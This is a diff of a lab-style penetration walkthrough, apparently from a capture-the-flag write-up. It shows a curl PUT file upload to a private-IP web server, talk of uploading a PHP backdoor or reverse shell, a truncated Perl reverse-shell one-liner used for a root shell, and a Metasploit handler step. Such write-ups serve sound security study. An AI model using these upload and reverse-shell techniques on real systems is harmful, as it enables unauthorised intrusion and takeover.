@@ -89,7 +89,7 @@ curl -T 'test.txt' 'http://192.168.114.132/test/test.txt' --http1.0
 Successfully Uploaded a file. 
 
 
-# Exploit
+# Exploit Vulnerability
 Now we have full reigns on upload , you can upload a reverse php shell, backdoor etc. In this case we'll upload a basic php system call.
 
 ##### Step 1. Create a backdoor
@@ -154,6 +154,8 @@ echo "`/usr/bin/perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if(
 Using the same shell, we can get a root shell.
 
 #### Step 2. Upload to target machine, and place in /tmp/
+
+WGET does not seem to work, so we upload through the same way in the previous section.
 
 #### Wait.
 Using msfconsole/exploit/multi/handler 
